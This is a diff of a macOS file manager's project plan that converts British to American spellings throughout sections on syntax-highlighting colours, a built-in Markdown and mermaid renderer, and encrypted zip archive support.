@@ -7933,7 +7933,7 @@ Three decisions, each of which changed something already written:
 - **The order of the diff scanner's tests *is* its correctness argument.** `--- a/file` and
   `+++ b/file` open with the same characters as a removed and an added line, so the file headers have
   to be tested first — written the other way round, every diff's own header reads as a deletion
-  followed by an insertion, which is a wrong colour exactly where a reader orients themselves.
+  followed by an insertion, which is a wrong color exactly where a reader orients themselves.
 
 And one measurement that corrects the table at the top of this milestone. The pre-milestone probe
 projected **17.2 ms** for a 4 MB scan; the shipping scanner measures **58 ms** (three runs, 57–59,
@@ -7947,14 +7947,14 @@ code-unit helpers was tried and measured as **noise** (52.5 against 51.6, i.e. s
 is reverted rather than kept — the same call NOTES.md records for the three Quick View animation
 fixes that measured worse or identical.
 
-#### Slice 3 — Colour, in the app (S) — landed 2026-08-06
+#### Slice 3 — Color, in the app (S) — landed 2026-08-06
 
 - [x] `SyntaxTheme` — `SyntaxToken.Kind` → `NSColor`. **Authored light/dark pairs, not the system
       palette**, which is a correction to the decision this milestone opened with and is argued
       below.
 - [x] `QuickViewTextView.show` builds an `NSMutableAttributedString` instead of assigning `.string`.
       The font and the `.textColor` default stay exactly as they are — highlighting *adds* foreground
-      colours to a document that already renders correctly, so the un-highlighted case is unchanged
+      colors to a document that already renders correctly, so the un-highlighted case is unchanged
       by construction and an unknown extension is not a special case.
 - [x] The tokenize runs on the existing detached read task in `showText`, beside `TextPreview.read`,
       under the same `loadToken` stale-guard. `TextPreview` gains no knowledge of languages: it
@@ -7971,8 +7971,8 @@ app, 1744 core, both linters clean), and a folder of nine mixed files stepped th
 ⌃⌥Q under both appearances: Python, shell, Swift, HTML, a `git diff`, `PLAN.md`, SQL, CSS and a JSON
 catalog, each correct, with no error on the process's stderr in either run.
 
-**The milestone's colour decision was reversed by a measurement, and re-taken with the user.** M17
-opened (PLAN.md §7) on *system dynamic colours*, on the stated ground that each resolves per
+**The milestone's color decision was reversed by a measurement, and re-taken with the user.** M17
+opened (PLAN.md §7) on *system dynamic colors*, on the stated ground that each resolves per
 appearance for free — "the only way to claim legible in both appearances without a screenshot of
 each". Measured against `.textBackgroundColor` in both appearances, alpha composited, before a line
 of `SyntaxTheme` was written:
@@ -7988,17 +7988,17 @@ The system palette is tuned for **fills** — a button, a badge, a selection —
 background, and the hues that fail are exactly the ones a syntax theme wants most. The premise held
 in dark mode and collapsed in light. So the light half is authored (Xcode's own Default Light values,
 each measured: keyword `#9B2393` 6.87:1, string `#C41A16` 5.99, comment `#267507` 5.79, number
-`#1C00CF` 10.77, type `#3E8087` 4.52) and the dark half stays the system colour. What the plan
+`#1C00CF` 10.77, type `#3E8087` 4.52) and the dark half stays the system color. What the plan
 actually wanted is untouched — one `NSColor` per kind that resolves itself, no Settings, no
 persistence, no picker — and the claim is now **stronger** than the original could make, because
 `SyntaxThemeTests` pins ≥ 4.5:1 for every kind in *both* appearances rather than trusting a
 screenshot of one. Chosen by the user 2026-08-06 over the two alternatives (restrict to the system
-colours that pass, which leaves a diff with no green; or ship the washed-out ones).
+colors that pass, which leaves a diff with no green; or ship the washed-out ones).
 
 Two more things the wiring turned up:
 
 - **`NSTextView.textStorage` does *not* drop the view to TextKit 1**, which had to be probed because
-  the neighbouring rule is the opposite: reading `.layoutManager` does, and `textStorage` is
+  the neighboring rule is the opposite: reading `.layoutManager` does, and `textStorage` is
   historically `layoutManager.textStorage`. On a real window, `textLayoutManager` is still non-`nil`
   after reading `.textStorage` and after a 4 MB `setAttributedString` through it — first display
   0.03 ms, scroll-to-end 2.7 ms, against 0.47 ms to install the same 4 MB as a plain string and
@@ -8014,14 +8014,14 @@ Two more things the wiring turned up:
 
 **Then the palette was re-taken a second time, same day, on sight of a README.** The Xcode-derived
 table above shipped and looked wrong in one specific way the user named immediately: *red, almost
-everywhere*. The cause was only half the colour table. `SyntaxMarkdownScanner` mapped a **fenced code
+everywhere*. The cause was only half the color table. `SyntaxMarkdownScanner` mapped a **fenced code
 block** to `.string`, so the layout tree and both `bash` blocks in this repo's own README rendered as
 one continuous red mass — a fence is routinely the largest thing on a page, so painting it all one
-literal colour makes the loudest region of the document the one carrying the least meaning. Two
+literal color makes the loudest region of the document the one carrying the least meaning. Two
 changes, and the second is the one that mattered:
 
 - **The palette is now VS Code's Dark Modern and Light Modern on both halves** (`dark_plus` /
-  `light_plus` token colours), replacing Xcode-light-plus-system-dark. Not an aesthetic preference
+  `light_plus` token colors), replacing Xcode-light-plus-system-dark. Not an aesthetic preference
   but a choice of *whose* theme: a file manager's preview is read beside the editor the file will be
   opened in. It cost nothing to verify — measured against the real `.textBackgroundColor` in both
   appearances before anything was written, every published value clears the same 4.5:1 floor
@@ -8030,11 +8030,11 @@ changes, and the second is the one that mattered:
   `#4EC9B0` 8.18). The dark half needed no adjustment at all, and that is not luck:
   `.textBackgroundColor` resolves to exactly `#1E1E1E` in dark mode, which *is* VS Code's classic
   editor background — the dark values are measured on the background they were designed for.
-  `SyntaxThemeTests.mayShareAColour` gained one change: `inserted` now shares with `number` rather
+  `SyntaxThemeTests.mayShareAColor` gained one change: `inserted` now shares with `number` rather
   than with `comment`, which is VS Code's own collision (both `#b5cea8` / `#098658` there too).
 - **A fence is three tokens, not one.** The two delimiter *lines* take `.keyword`, on the heading's
   argument — they are the document's own structure — and the **body** is scanned as the language its
-  info string names, or left entirely uncoloured when it names none. `SyntaxLanguage.forFenceInfo`
+  info string names, or left entirely uncolored when it names none. `SyntaxLanguage.forFenceInfo`
   is its own entry point rather than a call to `forFile(named:)`, because the two vocabularies
   disagree in both directions: `makefile` and `dockerfile` are whole *names* on that side and would
   be read as extensions, and the spelled-out `python`, `javascript`, `shell`, `objective-c` — what
@@ -8046,34 +8046,34 @@ changes, and the second is the one that mattered:
 
 Live-verified on this repo's README in both appearances: the layout tree renders plain, the `bash`
 blocks render as bash, and flipping the system appearance with the preview already open re-resolves
-every colour in place — which is the dynamic-pair design doing what it was built for.
+every color in place — which is the dynamic-pair design doing what it was built for.
 
 #### Deliberately not in scope
 
 Stated up front, because this is the milestone whose scope has no natural floor, and the correctness
 tail is what would turn three days into three weeks. A regex-free single-pass scanner is about 95 %
 right, and the remaining 5 % is a list of *decisions*, not bugs: **string interpolation** (`\(…)` in
-Swift, `${…}` in JS and shell — a keyword inside a string will be coloured as a string, which is the
+Swift, `${…}` in JS and shell — a keyword inside a string will be colored as a string, which is the
 quiet direction), **JS regex literals** (the `/` ambiguity with division is genuinely undecidable
-without a parser), **heredocs** in shell and PHP, **JSX**, and semantic colouring of any kind (a type
+without a parser), **heredocs** in shell and PHP, **JSX**, and semantic coloring of any kind (a type
 is a type because of a declaration somewhere else — that is a compiler, not a scanner). Each gets a
 comment naming it where the grammar would otherwise have handled it, so the next reader knows it was
 chosen.
 
 Also not in scope, each for its own reason: a **theme picker** (costed alongside this at the estimate
-— per-appearance colour pairs, persistence, a Settings section; deferred in favour of system colours,
+— per-appearance color pairs, persistence, a Settings section; deferred in favor of system colors,
 and the M15 palette work is the precedent for what it costs if it is ever wanted); **line numbers,
 folding and a minimap**, which are editor features, and Dirnex hands editing to the user's own editor
 (§M11's largest deliberate call); highlighting inside the **rendered** HTML style, which is the page's
 own business; and any third-party highlighter — **Highlightr** (highlight.js in a `JSContext`) buys
 ~190 languages at the price of a dependency, a JS engine on every cursor step and output §2 cannot
 test, and **tree-sitter** is a C dependency plus one compiled grammar per language. Both rejected
-2026-08-06 in favour of a hand-rolled scanner the core can test.
+2026-08-06 in favor of a hand-rolled scanner the core can test.
 
 ### M18 — Quick View: Markdown as a document (M)
 
-Goal: `.md` becomes the **second dual-style type**. `1` keeps the source, coloured by M17's Markdown
-scanner; `2` renders the document those bytes describe — headings, tables, lists, coloured code,
+Goal: `.md` becomes the **second dual-style type**. `1` keeps the source, colored by M17's Markdown
+scanner; `2` renders the document those bytes describe — headings, tables, lists, colored code,
 `[[_TOC_]]` and mermaid diagrams — **hand-rolled end to end**, with no JavaScript in the page and no
 third-party renderer anywhere in it. Opened 2026-08-06, closed 2026-08-07 with all four slices
 landed.
@@ -8082,14 +8082,14 @@ M16 named this in its own undone column ("Markdown and RTF as dual-style types")
 worth taking: a `.md` is the format most likely to be *read in a file manager* rather than opened,
 and what Quick Look shows for one today is plain text with the syntax on display. Almost everything
 the milestone needs already exists — the render-style enum and its two keys, the sandboxed web view
-with its compiled block-remote rules, and the scanner that can colour a fence's contents. What is
+with its compiled block-remote rules, and the scanner that can color a fence's contents. What is
 missing is a renderer.
 
 **Where the work lives.** Markdown → HTML is a pure function over bytes, so §2 puts it in
 `DirnexCore` with tests; the *stylesheet* is presentation and stays in the app — exactly the division
 M17 already draws between `SyntaxToken.Kind` and `SyntaxTheme`, and the one `TextPreview`'s own doc
-comment states. The core emits semantic HTML carrying class names and never a colour; the app hands
-the web view a `<style>` block built from `SyntaxTheme` and the system label colours. That is what
+comment states. The core emits semantic HTML carrying class names and never a color; the app hands
+the web view a `<style>` block built from `SyntaxTheme` and the system label colors. That is what
 makes the rendered page follow light and dark for free, diagrams included.
 
 **Raw HTML in a `.md` is escaped, not passed through.** CommonMark says to pass it; a preview that
@@ -8139,8 +8139,8 @@ anything half-built.
 
 - [x] `MarkdownBlockParser` — a line-oriented **block** pass, then an **inline** pass per block. Two
       passes rather than M17's one, and the departure is the point: that scanner is single-pass with
-      one lookahead *because* it only ever adds colour, so a construct it gets wrong is a wrong
-      colour. A renderer produces the document itself, and gets the previous line and the block's
+      one lookahead *because* it only ever adds color, so a construct it gets wrong is a wrong
+      color. A renderer produces the document itself, and gets the previous line and the block's
       whole text. Which is also why **setext headings and indented code blocks** — both named in
       M17's undone column as needing a lookahead the scanner does not keep — are in scope here, and
       both landed.
@@ -8188,7 +8188,7 @@ Two findings worth carrying:
   reached a **tag**: the attribute names against a closed set, and every `href`/`src` scheme against
   an allow-list. Now in docs/NOTES.md ▸ Testing.
 
-#### Slice 2 — `[[_TOC_]]`, anchors, and coloured fences (S, core-only) — landed 2026-08-06
+#### Slice 2 — `[[_TOC_]]`, anchors, and colored fences (S, core-only) — landed 2026-08-06
 
 - [x] Heading slugs, GitHub's rule, emitted as `id` on every heading so any anchor in the document
       resolves — including the ones the file's author already wrote by hand. **Measured, not read**:
@@ -8200,7 +8200,7 @@ Two findings worth carrying:
       what makes a marker inside a code fence stay text, and it does.
 - [x] A fence whose info string names a language is tokenized through **M17's existing
       `SyntaxHighlighter`** and emitted as one `<span class="tok-…">` per `SyntaxToken.Kind`, so the
-      fence in the rendered page and the file in source mode are coloured by the same scanner and the
+      fence in the rendered page and the file in source mode are colored by the same scanner and the
       same table. No language, or one no grammar claims, is plain `<code>` — the same "an unknown
       type is not a special case" rule the text backend already keeps.
 
@@ -8248,7 +8248,7 @@ Three findings worth carrying:
       we generate has no scripts to refuse. Same argument that already keeps it out of source mode.
       It is the one site that deliberately keeps asking `isRenderableHTML`, so it has its own test.
 - [x] `QuickViewMarkdownStyle` — the stylesheet, built at load time from `SyntaxTheme` for fences and
-      the system label colours for the document, with the system font for prose and the fixed-pitch
+      the system label colors for the document, with the system font for prose and the fixed-pitch
       font for code. **Not** re-generated on `viewDidChangeEffectiveAppearance`: probed, the page
       follows the appearance itself, so it carries both palettes instead (below).
 - [x] `QuickViewMarkdownImages` — the answer to the milestone's first probe, which did not come out
@@ -8261,10 +8261,10 @@ Three findings worth carrying:
       through a folder of `.md`.
 
 Exit: **met**, live at all three sizes. `2` renders `PLAN.md` and a document exercising every
-construct; `1` still shows the coloured source; a TOC link moved the reading position by real click;
+construct; `1` still shows the colored source; a TOC link moved the reading position by real click;
 ← / → stepped and re-rendered even after clicking *into* the page; `⌘L` then `/tmp/12` put both
 digits in the path field with the preview up (M16's own regression); and flipping the system to light
-and back re-coloured the page **with the scroll position pixel-identical**. 29 new tests (16 app + 13
+and back re-colored the page **with the scroll position pixel-identical**. 29 new tests (16 app + 13
 core), 1844 core + 253 app green, both linters clean.
 
 Four findings worth carrying:
@@ -8289,7 +8289,7 @@ Four findings worth carrying:
   effective appearance with no `color-scheme` declaration and re-evaluates with **no reload**, so the
   stylesheet carries both palettes under one media query. The design this replaced (re-generate on
   `viewDidChangeEffectiveAppearance`) would have thrown away the reading position on every flip.
-- **There is no system colour for "slightly off the text background".** `.windowBackgroundColor` and
+- **There is no system color for "slightly off the text background".** `.windowBackgroundColor` and
   `.controlBackgroundColor` are byte-identical to it in both appearances, `.gridColor` inverts in
   dark, and even the gentlest fill takes `typeOrTag` from 4.59:1 to **3.68:1** — because M17 authored
   that palette against `.textBackgroundColor`. So a code fence is bordered rather than filled. All in
@@ -8306,8 +8306,8 @@ Four findings worth carrying:
       removal**, so `A --> B --> A` draws instead of hanging. A sequence diagram is positional and
       needs no layout beyond column and row arithmetic. **One thing the plan did not name and the
       first live run demanded: dummy nodes** (below).
-- [x] `MermaidSVG` — the emitter, in class names and `currentColor` and never a literal colour, so
-      Slice 3's stylesheet colours the diagram in both appearances the way it colours everything else.
+- [x] `MermaidSVG` — the emitter, in class names and `currentColor` and never a literal color, so
+      Slice 3's stylesheet colors the diagram in both appearances the way it colors everything else.
 - [x] Text width through the injected metric from the probe above; the fixed-advance fake makes every
       layout assertion in the tests exact.
 - [x] Anything else in a `mermaid` fence — a class diagram, a gantt, a state chart, an ER diagram —
@@ -8319,7 +8319,7 @@ Four findings worth carrying:
 Exit: **met**, verified live at full-window size in both appearances. `PLAN.md`-style prose carrying
 a flowchart, an `LR` chart and a sequence diagram draws all three legibly; `stateDiagram-v2` shows
 its source and names itself; a `subgraph` chart draws *and* reports the frame it did not draw; `1`
-still shows the coloured source. 60 new tests (54 core + 6 app), 1902 core + 260 app green, both
+still shows the colored source. 60 new tests (54 core + 6 app), 1902 core + 260 app green, both
 linters clean.
 
 Four findings worth carrying:
@@ -8348,13 +8348,13 @@ Four findings worth carrying:
 
 Followed up 2026-08-07 after reading a page: a diagram laid out in the *small* system size reads
 noticeably smaller than the prose beside it, so a finished drawing is now **magnified** —
-`MarkdownRenderOptions.diagramScale`, 1.25 in the app — and the figure is centred in the reading
+`MarkdownRenderOptions.diagramScale`, 1.25 in the app — and the figure is centered in the reading
 column. Magnifying the `<svg>`'s displayed size while the `viewBox` stays put is what makes it one
 line rather than a second layout: boxes, gaps, strokes and labels all grow together, so no
 proportion the layout measured can drift, and `max-width: 100%` still shrinks the whole thing on a
 narrow window. Growing the label font instead would have grown the text inside boxes whose paddings
-and layer gaps are constants. The centring needs its own carve-out for the fallback — a `<pre>`
-inside a centred `<figure>` is *source code*, and it stays left-aligned.
+and layer gaps are constants. The centering needs its own carve-out for the fallback — a `<pre>`
+inside a centered `<figure>` is *source code*, and it stays left-aligned.
 
 #### Deliberately not in scope
 
@@ -8459,7 +8459,7 @@ probe overturned the architecture decision the milestone opened on**. All of it 
       and ordinary packing still use `bsdtar`.
 - [x] `EncryptedArchiveWriter` / `EncryptedArchiveReader` (+ `…+Wrapping` / `…+Placing`) — write and
       read an AES-256 zip, with byte progress, cancellation between chunks and entries, and the
-      archive built under a temporary name and renamed into place only on success, so a cancelled
+      archive built under a temporary name and renamed into place only on success, so a canceled
       pack leaves nothing to mistake for a whole archive later. `inspect` reads headers only, which
       is what lets the app ask "does this need a passphrase" for free.
 - [x] `ArchivePassphrase` — the type the secret lives in, from the field to the syscall. Two
@@ -8467,7 +8467,7 @@ probe overturned the architecture decision the milestone opened on**. All of it 
       (the passphrase and then a close — what `-stdinpass` needs) beside `withUnsafeCString`. Both
       look right at the call site, which is the whole reason they are one type's two methods and not
       two call sites' improvisations.
-- [x] `ArchiveEntryPath` — the traversal defence, in two independent layers: a name rule, and an
+- [x] `ArchiveEntryPath` — the traversal defense, in two independent layers: a name rule, and an
       `lstat` walk that refuses to descend through a symlink (the path-shaped equivalent of
       `openat(O_NOFOLLOW)`). Both attack fixtures were produced by `bsdtar` itself, and each layer
       has a **negative control** — with the name rule deliberately neutered, the `lstat` walk still
@@ -8495,7 +8495,7 @@ rebuild.
 
 - [x] The pack sheet gained Encryption / Passphrase / Repeat / "Hide file names", and a footer that
       says plainly what a lost passphrase costs *and* which apps can open the result. Moving away
-      from zip **resets** the popup rather than merely disabling it — a greyed "AES-256" over a
+      from zip **resets** the popup rather than merely disabling it — a grayed "AES-256" over a
       `.tar.gz` reads as a promise the writer cannot keep — and the footer is measured at build time
       for its longest state so the accessory's frame never moves under the popup.
 - [x] An encrypted pack goes on the **operation queue** as `FileOperation.Kind.pack`
